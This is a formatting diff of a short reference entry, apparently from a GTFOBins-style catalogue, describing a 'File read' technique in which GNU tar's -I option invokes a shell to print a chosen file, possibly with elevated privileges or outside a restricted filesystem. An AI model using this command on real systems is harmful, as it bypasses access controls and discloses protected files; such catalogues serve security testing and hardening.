@@ -1,9 +1,8 @@
-# File read
+File read
 
-## It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+ It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
 
-##    This only works for GNU tar.
-```
+    This only works for GNU tar.
+
     LFILE=file_to_read
     tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
-```
